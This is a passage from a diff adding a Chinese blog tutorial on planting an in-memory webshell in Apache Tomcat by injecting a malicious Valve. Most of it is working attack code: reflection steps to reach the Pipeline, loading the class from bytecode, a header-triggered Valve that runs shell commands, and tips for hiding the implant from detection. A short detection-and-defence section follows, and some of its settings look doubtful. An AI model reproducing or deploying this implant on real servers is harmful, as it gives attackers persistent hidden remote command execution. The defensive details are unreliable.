contextField.get(standardRoot)<span class="hljs-comment">; // 得到目标StandardContext</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>关键路径</strong>：<br><code>WebappClassLoader</code>→<code>resources</code>(<code>StandardRoot</code>) →<code>context</code>(<code>StandardContext</code>)</li>
+</ul>
+<h4 id="步骤3：获取Pipeline对象"><a href="#步骤3：获取Pipeline对象" class="headerlink" title="步骤3：获取Pipeline对象"></a><strong>步骤3：获取Pipeline对象</strong></h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">Method</span> <span class="hljs-title function_">getPipelineMethod</span> = <span class="hljs-title function_">standardContext</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;getPipeline&quot;)</span>;<br>Object pipeline = getPipelineMethod.invoke(standardContext)<span class="hljs-punctuation">;</span> <span class="hljs-comment">// StandardPipeline实例</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="步骤4：定义恶意Valve类（内存加载）"><a href="#步骤4：定义恶意Valve类（内存加载）" class="headerlink" title="步骤4：定义恶意Valve类（内存加载）"></a><strong>步骤4：定义恶意Valve类（内存加载）</strong></h4><p><strong>方案A：硬编码字节码（推荐）</strong></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// 1. 预编译EvilValve.class并转为字节数组</span><br><span class="hljs-type">byte</span>[] evilValveBytecode = Base<span class="hljs-number">64.</span><span class="hljs-built_in">decode</span>(<span class="hljs-string">&quot;yv66vgAAADQAKgoABwAUBwAVCAAWCgAB...&quot;</span>);<br><br><span class="hljs-comment">// 2. 反射调用ClassLoader.defineClass</span><br>Method defineClassMethod = ClassLoader.<span class="hljs-keyword">class</span>.<span class="hljs-built_in">getDeclaredMethod</span>(<br>    <span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>, <span class="hljs-type">byte</span>[].<span class="hljs-keyword">class</span>, <span class="hljs-type">int</span>.<span class="hljs-keyword">class</span>, <span class="hljs-type">int</span>.<span class="hljs-keyword">class</span>);<br>defineClassMethod.<span class="hljs-built_in">setAccessible</span>(<span class="hljs-literal">true</span>);<br>Class&lt;?&gt; evilValveClass = (Class&lt;?&gt;) defineClassMethod.<span class="hljs-built_in">invoke</span>(<br>    webappClassLoader, <span class="hljs-string">&quot;com.evil.EvilValve&quot;</span>, evilValveBytecode, <span class="hljs-number">0</span>, evilValveBytecode.length);<br></code></pre></td></tr></table></figure>
+
+<p><strong>方案B：动态生成字节码（ASM&#x2F;Javassist）</strong></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino">ClassWriter cw = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ClassWriter</span>(<span class="hljs-number">0</span>);<br>cw.<span class="hljs-built_in">visit</span>(Opcodes.V1_8, ACC_PUBLIC, <span class="hljs-string">&quot;com/evil/EvilValve&quot;</span>, null, <span class="hljs-string">&quot;java/lang/Object&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">String</span>[]&#123;<span class="hljs-string">&quot;org/apache/catalina/Valve&quot;</span>&#125;);<br><span class="hljs-comment">// ... 生成invoke()方法字节码 ...</span><br><span class="hljs-type">byte</span>[] evilValveBytecode = cw.<span class="hljs-built_in">toByteArray</span>();<br><span class="hljs-comment">// 后续同方案A的defineClass调用</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="步骤5：实例化并注入Valve"><a href="#步骤5：实例化并注入Valve" class="headerlink" title="步骤5：实例化并注入Valve"></a><strong>步骤5：实例化并注入Valve</strong></h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-comment">// 实例化恶意Valve</span><br><span class="hljs-keyword">Constructor</span>&lt;?&gt; <span class="hljs-title function_">constructor</span> = <span class="hljs-title function_">evilValveClass</span>.<span class="hljs-title function_">getDeclaredConstructor</span><span class="hljs-params">()</span>;<br><span class="hljs-keyword">constructor</span>.setAccessible(<span class="hljs-keyword">true</span>)<span class="hljs-punctuation">;</span><br>Object evilValve = <span class="hljs-keyword">constructor</span>.newInstance()<span class="hljs-punctuation">;</span><br><br><span class="hljs-comment">// 获取Pipeline的addValve方法</span><br><span class="hljs-keyword">Method</span> <span class="hljs-title function_">addValveMethod</span> = <span class="hljs-title function_">pipeline</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;addValve&quot;, Valve.class)</span>;<br>addValveMethod.invoke(pipeline, evilValve)<span class="hljs-punctuation">;</span> <span class="hljs-comment">// 注入到管道末尾</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="步骤6（可选）：控制注入位置"><a href="#步骤6（可选）：控制注入位置" class="headerlink" title="步骤6（可选）：控制注入位置"></a><strong>步骤6（可选）：控制注入位置</strong></h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// 获取Pipeline的valves数组</span><br>Field valvesField = pipeline.getClass().getDeclaredField(<span class="hljs-string">&quot;valves&quot;</span>);<br>valvesField.setAccessible(<span class="hljs-literal">true</span>);<br>Valve[] valves = (Valve[]) valvesField.get(pipeline);<br><br><span class="hljs-comment">// 创建新数组并将恶意Valve插入第二位（紧接AccessLogValve后）</span><br>Valve[] newValves = <span class="hljs-keyword">new</span> Valve[valves.<span class="hljs-built_in">length</span> + <span class="hljs-number">1</span>];<br>System.arraycopy(valves, <span class="hljs-number">0</span>, newValves, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);    <span class="hljs-comment">// 保留第一个Valve</span><br>newValves[<span class="hljs-number">1</span>] = (Valve) evilValve;                <span class="hljs-comment">// 恶意Valve插入第二位</span><br>System.arraycopy(valves, <span class="hljs-number">1</span>, newValves, <span class="hljs-number">2</span>, valves.<span class="hljs-built_in">length</span> - <span class="hljs-number">1</span>);<br>valvesField.set(pipeline, newValves);<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>位置策略</strong>：插入在<code>StandardContextValve</code>之前（通常索引1）确保捕获所有请求。</li>
+</ul>
+<h3 id="三、恶意Valve类实现模板"><a href="#三、恶意Valve类实现模板" class="headerlink" title="三、恶意Valve类实现模板"></a><strong>三、恶意Valve类实现模板</strong></h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilValve</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> final <span class="hljs-title class_">String</span> password = <span class="hljs-string">&quot;X-TOKEN&quot;</span>; <span class="hljs-comment">// 激活密码</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">invoke</span>(<span class="hljs-title class_">Request</span> request, <span class="hljs-title class_">Response</span> response) throws <span class="hljs-title class_">IOException</span>, <span class="hljs-title class_">ServletException</span> &#123;<br>        <span class="hljs-comment">// 1. 检查激活密码</span><br>        <span class="hljs-title class_">String</span> cmd = request.<span class="hljs-title function_">getHeader</span>(password);<br>        <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-title function_">getNext</span>().<span class="hljs-title function_">invoke</span>(request, response); <span class="hljs-comment">// 传递请求</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 2. 执行命令并回显</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title class_">String</span>[] cmds = <span class="hljs-title class_">System</span>.<span class="hljs-title function_">getProperty</span>(<span class="hljs-string">&quot;os.name&quot;</span>).<span class="hljs-title function_">contains</span>(<span class="hljs-string">&quot;win&quot;</span>) <br>                ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125; <br>                : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>            <span class="hljs-title class_">Process</span> p = <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(cmds);<br>            <span class="hljs-title class_">InputStream</span> <span class="hljs-keyword">in</span> = p.<span class="hljs-title function_">getInputStream</span>();<br>            <span class="hljs-comment">// ... 读取输出并写入response ...</span><br>        &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;<br>            response.<span class="hljs-title function_">getWriter</span>().<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;ERROR: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>());<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 其他Valve接口方法（空实现）</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; &#125;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-title class_">Valve</span> <span class="hljs-title function_">getNext</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; &#125;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setNext</span>(<span class="hljs-params"><span class="hljs-title class_">Valve</span> valve</span>) &#123;&#125;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">backgroundProcess</span>(<span class="hljs-params"></span>) &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="四、技术难点与规避方案"><a href="#四、技术难点与规避方案" class="headerlink" title="四、技术难点与规避方案"></a><strong>四、技术难点与规避方案</strong></h3><ol>
+<li><p><strong>ClassLoader穿透问题</strong></p>
+<ul>
+<li><p>场景：在<code>BootstrapClassLoader</code>中执行（如反序列化漏洞）</p>
+</li>
+<li><p>方案：通过线程上下文类加载器传递</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">Thread<span class="hljs-selector-class">.currentThread</span>()<span class="hljs-selector-class">.setContextClassLoader</span>(webappClassLoader);<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>Tomcat版本兼容性</strong></p>
+<ul>
+<li><p><code>StandardRoot</code>路径变化（Tomcat 8.0+）：</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-comment">// Tomcat 8.5+ 获取StandardContext</span><br>Object resources = webappClassLoader.getResources()<span class="hljs-punctuation">;</span><br><span class="hljs-keyword">Method</span> <span class="hljs-title function_">getContextMethod</span> = <span class="hljs-title function_">resources</span>.<span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title function_">getMethod</span><span class="hljs-params">(&quot;getContext&quot;)</span>;<br>Object standardContext = getContextMethod.invoke(resources)<span class="hljs-punctuation">;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>内存马隐身技巧</strong></p>
+<ul>
+<li>类名伪装：<code>com.sun.tools.javac.util.Context</code>（仿JDK类）</li>
+<li>字节码加密：运行时解密后再defineClass</li>
+<li>惰性加载：首次匹配密码时才初始化命令执行逻辑</li>
+</ul>
+</li>
+</ol>
+<h3 id="五、检测与防御手段"><a href="#五、检测与防御手段" class="headerlink" title="五、检测与防御手段"></a><strong>五、检测与防御手段</strong></h3><h4 id="检测方案"><a href="#检测方案" class="headerlink" title="检测方案"></a><strong>检测方案</strong></h4><ol>
+<li><p><strong>Heap Dump分析</strong></p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> java.lang.<span class="hljs-keyword">Object</span> <br><span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">toString</span>() <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&quot;%StandardContextValve%&quot;</span> <br><span class="hljs-keyword">AND</span> dominators() INCLUDES $.valves<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>定位<code>StandardPipeline.valves</code>数组中异常Valve</li>
+</ul>
+</li>
+<li><p><strong>RASP监控点</strong></p>
+<ul>
+<li>拦截<code>ClassLoader.defineClass()</code>调用</li>
+<li>监控<code>StandardPipeline.addValve()</code>反射调用栈</li>
+<li>检测非初始化阶段新增的Valve</li>
+</ul>
+</li>
+<li><p><strong>行为特征检测</strong></p>
+<ul>
+<li>请求头包含<code>X-TOKEN</code>等固定标记</li>
+<li>无关联页面的HTTP请求返回命令输出</li>
+</ul>
+</li>
+</ol>
+<h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a><strong>防御措施</strong></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 禁用Context的管道修改 (context.xml) --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Context</span> <span class="hljs-attr">allowPipelineModification</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><p><strong>策略限制</strong></p>
+<ul>
+<li>禁止反射调用<code>defineClass()</code>（SecurityManager）</li>
+<li>锁定<code>StandardPipeline.valves</code>数组写权限</li>
+</ul>
+</li>
+<li><p><strong>运行时加固</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-javaagent:rasp_agent.<span class="hljs-attribute">jar</span>=block_unauth_valve<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="混合方式（利用-Tomcat-API-反射）"><a href="#混合方式（利用-Tomcat-API-反射）" class="headerlink" title="混合方式（利用 Tomcat API &amp; 反射）"></a>混合方式（利用 Tomcat API &amp; 反射）</h2><h3 id="一、混合注入的核心优势"><a href="#一、混合注入的核心优势" class="headerlink" title="一、混合注入的核心优势"></a>一、混合注入的核心优势</h3><ol>
+<li><strong>效率与稳定性的平衡</strong>：<ul>
+<li>使用Tomcat API直接调用核心方法，减少反射操作</li>
+<li>对关键路径使用反射突破访问限制</li>
+<li>比纯反射方式更稳定，减少版本兼容问题</li>
+</ul>
+</li>
+<li><strong>降低检测风险</strong>：<ul>
+<li>减少反射调用次数，避免触发RASP的反射监控</li>
+<li>直接API调用混入正常业务逻辑中更隐蔽</li>
+</ul>
+</li>
+<li><strong>开发便利性</strong>：<ul>
+<li>代码可读性更高</li>
+<li>调试和维护更简单</li>
+</ul>
+</li>
+</ol>
+<h3 id="二、混合注入详细流程"><a href="#二、混合注入详细流程" class="headerlink" title="二、混合注入详细流程"></a>二、混合注入详细流程</h3><h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><ul>
+<li>已获得执行环境（如通过JSP WebShell或反序列化漏洞）</li>
+<li>Tomcat API库（catalina.jar）在类路径中可用</li>
+<li>当前ClassLoader是WebappClassLoader</li>
+</ul>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 获取当前Web应用的ClassLoader<br>WebappClassLoader classLoader <span class="hljs-operator">=</span> <br>    (WebappClassLoader) Thread.currentThread().getContextClassLoader()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤1：获取StandardContext对象（混合方式）</strong></p>
+<h4 id="方法A：通过ServletContext（推荐）"><a href="#方法A：通过ServletContext（推荐）" class="headerlink" title="方法A：通过ServletContext（推荐）"></a>方法A：通过ServletContext（推荐）</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 在JSP/Servlet环境中可直接获取request<br>ServletRequest request <span class="hljs-operator">=</span> ...<span class="hljs-comment">; </span><br><br>// 获取ServletContext<br>ServletContext servletContext <span class="hljs-operator">=</span> request.getServletContext()<span class="hljs-comment">;</span><br><br>// 反射获取ApplicationContext<br>Field appCtxField <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>appCtxField.setAccessible(true)<span class="hljs-comment">;</span><br>ApplicationContext appCtx <span class="hljs-operator">=</span> (ApplicationContext) appCtxField.get(servletContext)<span class="hljs-comment">;</span><br><br>// 反射获取StandardContext<br>Field stdCtxField <span class="hljs-operator">=</span> appCtx.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>)<span class="hljs-comment">;</span><br>stdCtxField.setAccessible(true)<span class="hljs-comment">;</span><br>StandardContext standardContext <span class="hljs-operator">=</span> (StandardContext) stdCtxField.get(appCtx)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="方法B：通过ClassLoader（无request时）"><a href="#方法B：通过ClassLoader（无request时）" class="headerlink" title="方法B：通过ClassLoader（无request时）"></a>方法B：通过ClassLoader（无request时）</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 反射获取WebappClassLoader的resources字段<br>Field resourcesField <span class="hljs-operator">=</span> WebappClassLoader.class.getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>)<span class="hljs-comment">;</span><br>resourcesField.setAccessible(true)<span class="hljs-comment">;</span><br>StandardRoot standardRoot <span class="hljs-operator">=</span> (StandardRoot) resourcesField.get(classLoader)<span class="hljs-comment">;</span><br><br>// 直接API调用获取Context<br>Context context <span class="hljs-operator">=</span> standardRoot.getContext()<span class="hljs-comment">; // Tomcat 8.5+</span><br>StandardContext standardContext <span class="hljs-operator">=</span> (StandardContext) context<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤2：获取Pipeline对象（直接API）</strong></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">// 直接调用StandardContext的API方法<br>Pipeline pipeline <span class="hljs-operator">=</span> standardContext.getPipeline()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤3：创建恶意Valve实例</strong></p>
+<h4 id="方法A：动态类定义（无文件落地）"><a href="#方法A：动态类定义（无文件落地）" class="headerlink" title="方法A：动态类定义（无文件落地）"></a>方法A：动态类定义（无文件落地）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 定义恶意Valve类（简化版）</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StealthValve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TRIGGER_HEADER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;X-Health-Check&quot;</span>;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>        <span class="hljs-keyword">if</span> (request.getHeader(TRIGGER_HEADER) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 命令执行逻辑...</span><br>        &#125;<br>        getNext().invoke(request, response);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 在内存中编译类（使用Java Compiler API）</span><br><span class="hljs-type">JavaCompiler</span> <span class="hljs-variable">compiler</span> <span class="hljs-operator">=</span> ToolProvider.getSystemJavaCompiler();<br><span class="hljs-type">StandardJavaFileManager</span> <span class="hljs-variable">fileManager</span> <span class="hljs-operator">=</span> <br>    compiler.getStandardFileManager(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">// 动态生成源码</span><br><span class="hljs-type">String</span> <span class="hljs-variable">sourceCode</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;...&quot;</span>; <span class="hljs-comment">// 完整的StealthValve源码</span><br><span class="hljs-type">JavaFileObject</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> <br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleJavaFileObject</span>(URI.create(<span class="hljs-string">&quot;string:///StealthValve.java&quot;</span>), <br>        JavaFileObject.Kind.SOURCE) &#123;<br>        <span class="hljs-keyword">public</span> CharSequence <span class="hljs-title function_">getCharContent</span><span class="hljs-params">(<span class="hljs-type">boolean</span> ignoreEncodingErrors)</span> &#123;<br>            <span class="hljs-keyword">return</span> sourceCode;<br>        &#125;<br>    &#125;;<br><br><span class="hljs-comment">// 编译到内存</span><br><span class="hljs-type">CompilationTask</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> compiler.getTask(<span class="hljs-literal">null</span>, fileManager, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, Arrays.asList(source));<br>task.call();<br><br><span class="hljs-comment">// 加载编译后的类</span><br>Class&lt;?&gt; valveClass = classLoader.loadClass(<span class="hljs-string">&quot;com.example.StealthValve&quot;</span>);<br><span class="hljs-type">Valve</span> <span class="hljs-variable">evilValve</span> <span class="hljs-operator">=</span> (Valve) valveClass.newInstance();<br></code></pre></td></tr></table></figure>
+
+<h4 id="方法B：字节码注入（ASM增强）"><a href="#方法B：字节码注入（ASM增强）" class="headerlink" title="方法B：字节码注入（ASM增强）"></a>方法B：字节码注入（ASM增强）</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 使用ASM动态生成Valve字节码</span><br><span class="hljs-type">ClassWriter</span> <span class="hljs-variable">cw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassWriter</span>(ClassWriter.COMPUTE_FRAMES);<br>cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, <br>    <span class="hljs-string">&quot;com/evil/HealthCheckValve&quot;</span>, <span class="hljs-literal">null</span>, <br>    <span class="hljs-string">&quot;org/apache/catalina/valves/ValveBase&quot;</span>, <span class="hljs-literal">null</span>);<br><br><span class="hljs-comment">// 生成invoke方法...</span><br><span class="hljs-type">MethodVisitor</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> cw.visitMethod(Opcodes.ACC_PUBLIC, <span class="hljs-string">&quot;invoke&quot;</span>, <br>    <span class="hljs-string">&quot;(Lorg/apache/catalina/connector/Request;Lorg/apache/catalina/connector/Response;)V&quot;</span>, <br>    <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <br><span class="hljs-comment">// 方法逻辑：检查Header-&gt;执行命令-&gt;回传结果</span><br>mv.visitCode();<br><span class="hljs-comment">// ... 字节码指令 ...</span><br>mv.visitEnd();<br><br><span class="hljs-comment">// 定义类</span><br><span class="hljs-type">byte</span>[] bytecode = cw.toByteArray();<br>Class&lt;?&gt; valveClass = classLoader.defineClass(<br>    <span class="hljs-string">&quot;com.evil.HealthCheckValve&quot;</span>, bytecode, <span class="hljs-number">0</span>, bytecode.length);<br><span class="hljs-type">Valve</span> <span class="hljs-variable">evilValve</span> <span class="hljs-operator">=</span> (Valve) valveClass.newInstance();<br></code></pre></td></tr></table></figure>
+
+<p><strong>步骤4：注入Valve到管道（API+反射）</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// 直接API方式添加Valve</span><br>pipeline.addValve(evilValve);<br><br><span class="hljs-comment">// 调整位置到关键节点（反射操作）</span><br>Field valvesField = pipeline.getClass().getDeclaredField(<span class="hljs-string">&quot;valves&quot;</span>);<br>valvesField.setAccessible(<span class="hljs-literal">true</span>);<br>Valve[] valves = (Valve[]) valvesField.<span class="hljs-keyword">get</span>(pipeline);<br><br><span class="hljs-comment">// 查找StandardContextValve的位置</span><br><span class="hljs-built_in">int</span> targetIndex = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; valves.length; i++) &#123;<br>    <span class="hljs-keyword">if</span> (valves[i] instanceof StandardContextValve) &#123;<br>        targetIndex = i;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 在StandardContextValve前插入</span><br><span class="hljs-keyword">if</span> (targetIndex != <span class="hljs-number">-1</span>) &#123;<br>    Valve[] newValves = <span class="hljs-keyword">new</span> Valve[valves.length + <span class="hljs-number">1</span>];<br>    System.arraycopy(valves, <span class="hljs-number">0</span>, newValves, <span class="hljs-number">0</span>, targetIndex);<br>    newValves[targetIndex] = evilValve;<br>    System.arraycopy(valves, targetIndex, newValves, <br>        targetIndex + <span class="hljs-number">1</span>, valves.length - targetIndex);<br>    valvesField.<span 